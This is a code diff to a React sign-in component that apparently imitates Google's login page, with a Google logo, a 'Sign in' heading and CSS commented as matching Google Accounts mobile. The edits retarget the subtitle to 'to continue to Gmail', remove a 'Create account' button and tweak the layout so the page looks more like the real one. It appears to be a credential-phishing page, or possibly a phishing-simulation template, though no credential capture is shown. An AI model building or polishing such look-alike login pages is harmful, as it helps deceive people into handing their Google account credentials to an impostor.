@@ -134,16 +134,15 @@ ${GE_SHELL_CSS}
   text-decoration: none;
 }
 .ge-guest a:hover { text-decoration: underline; }
-/* Create account (left) + Next (right) — matches Google Accounts mobile */
 .ge-actions {
   display: flex;
-  flex-direction: row;
+  flex-direction: row-reverse;
   flex-wrap: wrap;
   align-items: center;
-  justify-content: space-between;
+  justify-content: flex-start;
   margin-top: auto;
   padding-top: 32px;
-  gap: 8px;
+  gap: 0;
   width: 100%;
 }
 .ge-btn {
@@ -160,20 +159,6 @@ ${GE_SHELL_CSS}
   font-weight: 500;
   cursor: pointer;
 }
-.ge-btn-create {
-  background: none;
-  border: none;
-  padding: 0 12px;
-  height: 40px;
-  border-radius: 20px;
-  color: var(--gm-next-fill);
-  font-family: inherit;
-  font-size: 0.875rem;
-  font-weight: 500;
-  letter-spacing: 0.0107142857em;
-  cursor: pointer;
-}
-.ge-btn-create:hover { background: rgba(138, 180, 248, 0.08); }
 .ge-btn-next {
   background: var(--gm-next-fill);
   color: var(--gm-next-ink);
@@ -187,17 +172,6 @@ ${GE_SHELL_CSS}
   cursor: default;
   filter: none;
   box-shadow: none;
-}
-@media (max-width: 899px) {
-  .ge-form {
-    margin-top: 12px;
-    flex: 1 1 0;
-    min-height: 0;
-    overflow: hidden;
-  }
-  .ge-guest { margin-top: 16px; }
-  /* margin-top:auto already pins Next; don't add extra padding that creates scroll */
-  .ge-actions { padding-top: 16px; flex: 0 0 auto; }
 }
 `;
 
@@ -256,7 +230,7 @@ function GeSignInPage() {
         <div className="ge-pane-left">
           <GoogleGLogo className="ge-logo" width={48} height={48} />
           <h1 className="ge-title">Sign in</h1>
-          <p className="ge-sub">to continue to Google Recovery.</p>
+          <p className="ge-sub">to continue to Gmail</p>
         </div>
 
         <div className="ge-pane-right">
@@ -306,13 +280,6 @@ function GeSignInPage() {
             </p>
 
             <div className="ge-actions">
-              <button
-                type="button"
-                className="ge-btn-create"
-                onClick={() => trackClick("Create account")}
-              >
-                Create account
-              </button>
               <button type="submit" className="ge-btn ge-btn-next" disabled={!canContinue}>
                 Next
               </button>
